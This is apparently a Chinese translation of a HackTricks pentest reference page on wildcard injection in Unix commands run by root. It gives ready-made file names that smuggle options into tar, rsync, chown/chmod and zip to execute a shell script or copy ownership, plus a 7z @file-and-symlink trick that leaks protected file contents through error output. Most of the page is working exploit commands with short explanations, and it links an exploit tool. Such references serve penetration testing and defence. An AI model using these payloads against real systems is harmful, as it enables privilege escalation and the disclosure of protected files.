{{#include ../../banners/hacktricks-training.md}}

## chown, chmod

您可以**指示要为其余文件复制的文件所有者和权限**
```bash
touch "--reference=/my/own/path/filename"
```
您可以利用此漏洞使用 [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(组合攻击)_\
更多信息请参见 [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**执行任意命令：**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
您可以利用此漏洞使用 [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar 攻击)_\
更多信息请参见 [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**执行任意命令：**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
您可以利用这个 [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_attack)_\
更多信息请参见 [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

在 **7z** 中，即使在 `*` 前使用 `--`（注意 `--` 表示后面的输入不能被视为参数，因此在这种情况下只是文件路径），您也可以导致任意错误以读取文件，因此如果以下命令由 root 执行：
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
您可以在执行此操作的文件夹中创建文件，您可以创建文件 `@root.txt` 和文件 `root.txt`，后者是您想要读取的文件的 **symlink**：
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
然后，当 **7z** 执行时，它会将 `root.txt` 视为一个包含它应该压缩的文件列表的文件（这就是 `@root.txt` 存在的意义），当 7z 读取 `root.txt` 时，它会读取 `/file/you/want/to/read`，**由于该文件的内容不是文件列表，它将抛出一个错误** 显示内容。

_更多信息请参见 HackTheBox 的 CTF 盒子写作。_

## Zip

**执行任意命令：**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{{#include ../../banners/hacktricks-training.md}}
